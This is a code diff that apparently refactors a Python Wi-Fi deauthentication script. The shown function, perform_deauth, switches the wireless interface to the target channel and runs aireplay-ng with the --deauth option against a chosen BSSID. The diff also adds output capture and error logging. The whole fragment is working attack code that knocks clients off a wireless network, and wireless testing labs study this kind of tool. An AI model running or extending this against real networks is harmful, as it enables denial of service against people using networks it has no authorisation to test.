@@ -69,20 +69,22 @@ def perform_deauth(bssid, channel, packet_count):
     current_channel = get_current_channel()
     if current_channel != channel:
         print(f"[!] Current channel ({current_channel}) does not match target channel ({channel}). Changing channel...")
-        if set_channel(channel):
-            print(f"[*] Channel changed to {channel}. Continuing attack...")
-        else:
+        if not set_channel(channel):
             print("[!] Failed to change channel. Aborting attack.")
             return
-
+        print(f"[*] Channel changed to {channel}. Continuing attack...")
+    
     print(f"[*] Launching deauth attack on BSSID: {bssid} with {packet_count} packets...")
     try:
-        subprocess.run(
+        # Execute aireplay-ng
+        result = subprocess.run(
             ["aireplay-ng", "--deauth", str(packet_count), "-a", bssid, monitor_interface],
-            check=True
+            check=True, capture_output=True, text=True
         )
+        print(result.stdout)  # Output of aireplay-ng if successful
     except subprocess.CalledProcessError as e:
         print(f"[!] Error executing deauth attack: {e}")
+        print(f"[!] Output: {e.output}")
 
 def main():
     # Ensure monitor mode is enabled
